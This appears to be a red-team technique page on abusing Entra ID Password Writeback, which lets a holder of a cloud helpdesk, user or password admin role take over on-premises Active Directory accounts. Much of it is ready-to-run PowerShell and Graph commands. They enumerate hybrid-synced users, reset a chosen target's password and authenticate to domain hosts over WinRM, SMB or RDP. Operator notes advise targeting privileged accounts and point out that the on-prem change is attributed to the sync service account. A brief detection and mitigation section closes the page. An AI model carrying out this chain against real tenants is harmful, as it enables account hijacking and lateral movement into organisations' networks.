## Overview

Password Writeback is an Entra ID Connect feature that synchronizes password changes made in the cloud back to the on-premises Active Directory object. When enabled and a privileged cloud identity resets a hybrid-synced user's password, that new password is immediately propagated to the AD object — making it valid for NTLM and Kerberos authentication against on-prem infrastructure.

This converts a cloud admin role (`User Administrator`, `Helpdesk Administrator`, or `Password Administrator`) into a direct bridge to on-premises access — no VPN, no network path to the DC, no AD-level privilege required. The cloud role is the entry point; the AD is the target.

## Preconditions

| Requirement | Detail |
|---|---|
| Cloud role with password reset capability | `User Administrator`, `Helpdesk Administrator`, or `Password Administrator` |
| Target user is hybrid-synced | `OnPremisesSyncEnabled: true` — cloud-only users have no on-prem object to write to |
| Password Writeback enabled | Must be active in Entra ID Connect configuration — verify before attempting |
| On-prem access path | A network route exists to validate the new credentials (WinRM, SMB, RDP) |

## Identifying Hybrid-Synced Targets

```powershell
# Enumerate users with on-prem sync enabled
$params = @{
    Method  = "GET"
    Uri     = "https://graph.microsoft.com/v1.0/users?`$filter=onPremisesSyncEnabled eq true&`$select=displayName,userPrincipalName,onPremisesSamAccountName"
    Headers = @{ Authorization = "Bearer $Graph" }
}
(Invoke-RestMethod @params).value |
    Select-Object displayName, userPrincipalName, onPremisesSamAccountName | Format-Table
```

Prioritize users whose `onPremisesSamAccountName` suggests privileged on-prem roles — service accounts, IT admin accounts, or accounts with names matching privileged group membership patterns found during recon.

## Verifying Password Writeback Is Active

```powershell
# Check SSPR configuration — writeback must show as enabled
$policy = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/beta/organization" `
    -Headers @{ Authorization = "Bearer $Graph" }

# Alternatively: Entra ID portal → Password reset → Properties → Password writeback: Enabled
```

If writeback is disabled, the cloud reset changes only the cloud object — the AD password remains unchanged.

## Attack Chain

```
Cloud role (User Admin, Helpdesk Admin, Password Admin)
     ↓
Identify hybrid-synced target (OnPremisesSyncEnabled: true)
     ↓
Reset password via Graph PATCH or Update-MgUser
     ↓
Entra ID Connect propagates new password to AD object (seconds to minutes)
     ↓
Authenticate against on-prem infrastructure:
  SMB   →  dir \\<DC>\SYSVOL
  WinRM →  New-PSSession -ComputerName <target>
  RDP   →  mstsc /v:<target>
```

## Resetting the Password

```powershell
$target = "<synced-user@tenant.com>"
$body   = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password                     = "<NEW_PASSWORD>"   # must meet domain complexity policy
    }
} | ConvertTo-Json

Invoke-RestMethod -Method PATCH `
    -Uri "https://graph.microsoft.com/v1.0/users/$target" `
    -Headers @{ Authorization = "Bearer $Graph"; "Content-Type" = "application/json" } `
    -Body $body
```

The new password must satisfy the on-premises domain password policy (length, complexity, history) — not just the cloud policy. If the reset is rejected, the domain policy is more restrictive than the cloud policy.

## Validating On-Prem Access

```powershell
$creds  = New-Object System.Management.Automation.PSCredential(
    "<DOMAIN>\<username>",
    (ConvertTo-SecureString "<NEW_PASSWORD>" -AsPlainText -Force)
)

# Test authentication via WinRM
$session = New-PSSession -ComputerName <target-host> -Credential $creds

# Test via SMB path (runas /netonly to avoid local Kerberos conflicts)
# runas /netonly /user:<DOMAIN>\<username> powershell.exe
# dir \\<DC-HOSTNAME>\SYSVOL
```

## Operator Notes

- Propagation time from cloud reset to on-prem depends on Entra ID Connect sync cycle (typically 30 minutes by default, but the password writeback path is near-real-time via a separate channel).
- The cloud reset generates an audit event in Entra ID immediately. The on-prem propagation does not generate a separate visible event — it appears as an administrative password change on the AD object.
- Target users with privileged on-prem roles: local admins on servers, domain admins, service accounts with access to sensitive infrastructure.
- If the target user's account is protected by a role that prevents cloud password reset (Global Admin, Privileged Auth Admin), the reset will fail. Check role assignments during recon.
- This technique requires knowing or choosing the new password — unlike credential harvesting techniques, the attacker controls what the password becomes.

## Detection / Friction Points

- Entra ID Audit Log: `Reset user password` — actor identity, target UPN, timestamp, and IP are logged. The cloud-admin-to-on-prem-reset pattern is detectable if cross-plane log correlation exists.
- On-premises Event Log: a password change event for the hybrid user appears on the DC after propagation — attributable to the Entra ID Connect service account, not the attacker identity directly.
- If the target user notices they are locked out (password changed without their action), it may trigger a security report.
- Microsoft Defender for Identity can detect abnormal password reset patterns when a cloud admin identity is not normally associated with password resets of privileged on-prem accounts.
- Mitigation: implement Privileged Access Workstations for hybrid admin accounts; use cloud-only accounts for Azure administration where possible; monitor cross-plane password reset events.
